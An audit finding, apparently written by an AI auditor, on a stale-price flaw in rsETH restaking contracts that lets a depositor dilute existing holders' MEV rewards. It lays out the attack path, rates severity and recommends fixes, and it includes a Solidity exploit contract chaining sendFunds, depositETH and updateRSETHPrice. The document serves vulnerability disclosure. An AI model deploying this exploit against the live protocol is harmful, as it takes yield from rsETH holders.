Now I have all the information needed to analyze this exploit. Let me trace through the exact code.

### Title
Permissionless `sendFunds()` Enables Stale-Price Deposit to Steal MEV/EL Rewards from Existing rsETH Holders — (`contracts/FeeReceiver.sol`)

---

### Summary

`FeeReceiver.sendFunds()` has no access control and can be called by any address at any time. When called, it transfers the accumulated MEV/EL reward balance directly into `LRTDepositPool`. Because `LRTOracle.rsETHPrice` is a **cached state variable** that is only updated by a separate, explicit call to `updateRSETHPrice()`, a window exists between the ETH arriving in the pool and the price being updated. Any depositor who calls `depositETH()` in this window receives rsETH calculated at the stale (pre-reward) price — more rsETH than their ETH contribution warrants — extracting value from existing rsETH holders.

---

### Finding Description

**Root cause 1 — Permissionless `sendFunds()`:** [1](#0-0) 

`sendFunds()` carries no role modifier. Any EOA or contract can call it at any time, forcing accumulated rewards into `LRTDepositPool` on demand.

**Root cause 2 — Permissionless, unguarded ETH receipt:** [2](#0-1) 

`receiveFromRewardReceiver()` is `external payable` with no caller check. The ETH lands in the pool immediately, increasing `address(this).balance`.

**Root cause 3 — `rsETHPrice` is a stale cached value:** [3](#0-2) 

`rsETHPrice` is a storage variable. It is only updated when `_updateRsETHPrice()` is explicitly invoked.

**Root cause 4 — Deposit minting uses the cached price:** [4](#0-3) 

`getRsETHAmountToMint` divides by `lrtOracle.rsETHPrice()` — the stored value — not a freshly computed one.

**Root cause 5 — ETH balance is live but price is not:** [5](#0-4) 

`getETHDistributionData()` returns `address(this).balance`, which reflects the rewards the moment they arrive. But `rsETHPrice` still reflects the pre-reward TVL until `updateRSETHPrice()` is called separately.

The comment at line 465–466 confirms the design intent: [6](#0-5) 

The protocol expects rewards to be "automatically accounted" once moved to the pool — but this accounting only happens at the **next** `updateRSETHPrice()` call, not atomically.

---

### Attack Path (Concrete)

Let:
- `T` = current TVL (ETH), `S` = rsETH supply, `P = T/S` = current (correct) `rsETHPrice`
- `R` = accumulated rewards sitting in `FeeReceiver`
- `D` = attacker's deposit amount

**Step 1.** Attacker calls `FeeReceiver.sendFunds()`.
- `R` ETH moves to `LRTDepositPool`. Pool balance = `T + R`.
- `rsETHPrice` is still `P` (stale; should be `P' = (T+R)/S > P`).

**Step 2.** Attacker calls `LRTDepositPool.depositETH{value: D}(0, "")`.
- rsETH minted = `D * 1e18 / P` (stale price).
- Correct amount at updated price would be `D * 1e18 / P'` < `D * 1e18 / P`.
- Attacker receives `ΔrsETH = D*(1/P - 1/P')` extra rsETH.

**Step 3.** `updateRSETHPrice()` is called (by anyone; it is `public whenNotPaused`). [7](#0-6) 

- New price = `(T + R + D) / (S + D/P)` — lower than `P'` because extra rsETH was minted.
- Existing holders' rsETH is worth less than it would have been without the attack.

All three steps can be executed atomically from a single attacker contract in one transaction, eliminating any front-running risk.

---

### Impact Explanation

The impact is **High — Theft of unclaimed yield**. The MEV/EL rewards `R` that should have accrued pro-rata to existing rsETH holders are partially captured by the attacker through the stale-price deposit. The protocol remains solvent (total ETH in the system covers total rsETH at the post-update price), so the "Critical: Protocol insolvency" framing in the question is **not accurate** — but the dilution of existing holders constitutes a concrete, repeatable theft of yield.

The magnitude scales with `R` (accumulated rewards) and `D` (attacker deposit size). With large MEV/EL reward accumulations (e.g., after many validator proposals), the profit per attack can be significant.

---

### Likelihood Explanation

- `sendFunds()` is unconditionally public — no governance, no timelock, no role.
- `updateRSETHPrice()` is also public, so the attacker controls both ends of the window.
- The attack is atomic (single transaction), requires no flash loan, no oracle manipulation, and no privileged access.
- It is repeatable every time rewards accumulate in `FeeReceiver`.

Likelihood: **High**.

---

### Recommendation

**Option A (preferred):** Atomically update the rsETH price inside `receiveFromRewardReceiver()` or at the end of `sendFunds()` before any deposit can occur at the stale price.

**Option B:** Add access control to `sendFunds()` (e.g., `onlyRole(LRTConstants.MANAGER)`) so only trusted operators can trigger the reward transfer, and they can coordinate it with a price update.

**Option C:** Replace the cached `rsETHPrice` with a freshly computed value inside `getRsETHAmountToMint()`, so the mint calculation always reflects the current on-chain TVL regardless of when `updateRSETHPrice()` was last called.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFeeReceiver { function sendFunds() external; }
interface IDepositPool { function depositETH(uint256 min, string calldata ref) external payable; }
interface IOracle { function updateRSETHPrice() external; function rsETHPrice() external view returns (uint256); }
interface IRSETH { function balanceOf(address) external view returns (uint256); }

contract ExploitStalePrice {
    IFeeReceiver feeReceiver;
    IDepositPool depositPool;
    IOracle oracle;
    IRSETH rseth;

    constructor(address _fr, address _dp, address _oracle, address _rseth) {
        feeReceiver = IFeeReceiver(_fr);
        depositPool = IDepositPool(_dp);
        oracle = IOracle(_oracle);
        rseth = IRSETH(_rseth);
    }

    function exploit() external payable {
        uint256 priceBefore = oracle.rsETHPrice();

        // Step 1: force accumulated rewards into DepositPool at stale price
        feeReceiver.sendFunds();

        // Step 2: deposit at stale (lower) price → receive excess rsETH
        depositPool.depositETH{value: msg.value}(0, "exploit");

        uint256 rsethReceived = rseth.balanceOf(address(this));

        // Step 3: update price (now reflects rewards + deposit)
        oracle.updateRSETHPrice();

        uint256 priceAfter = oracle.rsETHPrice();

        // Assert: attacker received more rsETH than at the correct price
        uint256 correctAmount = msg.value * 1e18 / priceAfter; // approximate
        assert(rsethReceived > correctAmount); // attacker profited from stale price
    }
}
```

**Fork-test assertion:** Deploy against a mainnet fork where `FeeReceiver.balance > 0` and `rsETHPrice` has not been updated since the last reward accumulation. Confirm `rsethReceived * rsETHPrice_after > msg.value` (attacker's rsETH is worth more than their ETH contribution).

### Citations

**File:** contracts/FeeReceiver.sol (L53-58)
```text
    function sendFunds() external {
        uint256 balance = address(this).balance;
        ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();

        emit MevRewardsAddedToTVL(balance);
    }
```

**File:** contracts/LRTDepositPool.sol (L61-61)
```text
    function receiveFromRewardReceiver() external payable { }
```

**File:** contracts/LRTDepositPool.sol (L465-467)
```text
    /// @dev rewards are not accounted here
    /// it will automatically be accounted once it is moved from feeReceiver/rewardReceiver to depositPool
    function getETHDistributionData()
```

**File:** contracts/LRTDepositPool.sol (L480-480)
```text
        ethLyingInDepositPool = address(this).balance;
```

**File:** contracts/LRTDepositPool.sol (L519-521)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L28-28)
```text
    uint256 public override rsETHPrice;
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```
